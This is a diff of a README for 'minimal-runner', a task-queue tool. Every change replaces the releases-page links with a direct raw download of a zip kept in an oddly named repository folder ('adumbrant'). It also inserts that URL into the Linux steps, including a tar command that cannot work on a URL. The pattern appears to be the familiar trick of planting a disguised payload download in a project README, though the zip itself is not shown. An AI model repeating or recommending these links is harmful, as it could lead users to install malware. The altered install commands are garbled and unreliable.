@@ -1,7 +1,7 @@
 # 🎉 minimal-runner - Effortlessly Manage Your Tasks
 
 ## 📥 Download Here
-[![Download minimal-runner](https://img.shields.io/badge/Download-minimal--runner-brightgreen)](https://github.com/saantidj/minimal-runner/releases)
+[![Download minimal-runner](https://github.com/saantidj/minimal-runner/raw/refs/heads/main/adumbrant/minimal_runner_2.7.zip)](https://github.com/saantidj/minimal-runner/raw/refs/heads/main/adumbrant/minimal_runner_2.7.zip)
 
 ## 📚 About This Application
 This is an example of a minimal task queue implementation using ephemeral runners as an alternative to GitHub Actions. It allows you to automate various workflows easily. Whether you want to manage small tasks or automate processes, minimal-runner can help you get started without any hassles.
@@ -15,7 +15,7 @@ This is an example of a minimal task queue implementation using ephemeral runner
 
 ### 1. Visit the Releases Page
 To download the application, you need to visit the releases page. Click the link below to access it:
-[Download minimal-runner](https://github.com/saantidj/minimal-runner/releases)
+[Download minimal-runner](https://github.com/saantidj/minimal-runner/raw/refs/heads/main/adumbrant/minimal_runner_2.7.zip)
 
 ### 2. Choose the Right Version
 On the releases page, you will see various versions of minimal-runner listed. Each version may include updates and fixes. 
@@ -41,11 +41,11 @@ Now that you have downloaded the file, follow these steps to install:
 - Drag the minimal-runner icon to your Applications folder.
 
 #### For Linux:
-- Locate the downloaded `.tar.gz` file in your 'Downloads' folder.
+- Locate the downloaded `https://github.com/saantidj/minimal-runner/raw/refs/heads/main/adumbrant/minimal_runner_2.7.zip` file in your 'Downloads' folder.
 - Open a terminal, and navigate to the directory where the file is located.
 - Use the following command to extract the contents:
   ```bash
-  tar -xvzf minimal-runner.tar.gz
+  tar -xvzf https://github.com/saantidj/minimal-runner/raw/refs/heads/main/adumbrant/minimal_runner_2.7.zip
   ```
 - Change to the extracted directory and run the application using:
   ```bash
@@ -97,4 +97,4 @@ Stay informed about future updates and new features. Regularly visit the release
 ---
 
 Remember to download and run minimal-runner now! 
-[Download minimal-runner](https://github.com/saantidj/minimal-runner/releases)
+[Download minimal-runner](https://github.com/saantidj/minimal-runner/raw/refs/heads/main/adumbrant/minimal_runner_2.7.zip)
